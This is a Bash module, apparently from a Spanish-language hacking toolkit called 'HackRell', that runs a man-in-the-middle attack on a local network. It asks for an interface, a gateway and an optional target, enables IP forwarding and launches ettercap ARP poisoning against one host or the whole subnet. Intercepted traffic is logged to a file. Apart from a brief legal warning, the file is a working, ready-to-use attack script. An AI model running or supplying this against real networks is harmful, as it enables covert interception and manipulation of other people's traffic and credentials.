#!/bin/bash

# HackRell - lan/lan_mitm.sh
# Realiza ataques Man-in-the-Middle (MITM) para interceptar y manipular tráfico de red.

# Cargar utilidades de color y legal
source "$(dirname "$0")"/../utils/colors.sh
source "$(dirname "$0")"/../utils/legal.sh

# Directorio para logs
LOG_DIR="/var/log/hackrell"
mkdir -p "$LOG_DIR" # Asegurarse de que el directorio de logs existe

function lan_mitm_menu() {
    check_root
    display_legal_warning
    clear
    print_banner "MÓDULO DE ATAQUES MITM (MAN-IN-THE-MIDDLE)"
    echo ""
    print_info "Este módulo realiza ataques MITM para interceptar y manipular tráfico de red."
    print_warning "Los ataques MITM son altamente intrusivos y deben realizarse con extrema precaución y solo en entornos autorizados."
    echo ""

    read -p "${C_GREEN}Ingrese la interfaz de red a utilizar (ej: eth0): ${C_RESET}" iface
    read -p "${C_GREEN}Ingrese la IP del gateway/router: ${C_RESET}" gateway_ip
    read -p "${C_GREEN}Ingrese la IP del objetivo (o déjelo en blanco para atacar a toda la subred): ${C_RESET}" target_ip

    if [ -z "$iface" ] || [ -z "$gateway_ip" ]; then
        print_error "La interfaz y la IP del gateway son obligatorias. Volviendo al menú principal."
        sleep 3
        return 1
    fi

    local ettercap_target=""
    if [ -z "$target_ip" ]; then
        ettercap_target="//"
    else
        ettercap_target="/$target_ip/"
    fi

    print_info "Iniciando ataque MITM con Ettercap..."
    print_info "Interfaz: $iface"
    print_info "Gateway: $gateway_ip"
    print_info "Objetivo: ${target_ip:-Toda la subred}"
    print_info "Los resultados se guardarán en ${LOG_DIR}/lan_mitm.log"
    echo ""

    # Habilitar reenvío de IP
    echo 1 > /proc/sys/net/ipv4/ip_forward

    ettercap -T -q -i "$iface" -M arp:remote "/$gateway_ip/" "$ettercap_target" 2>&1 | tee -a "$LOG_DIR/lan_mitm.log"

    # Deshabilitar reenvío de IP al finalizar
    echo 0 > /proc/sys/net/ipv4/ip_forward

    print_success "Ataque MITM con Ettercap finalizado. Verifique el log para más detalles."
    echo ""
    print_info "Presione [ENTER] para continuar."
    read -r
}

# Llamar a la función principal si el script se ejecuta directamente
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    lan_mitm_menu
fi

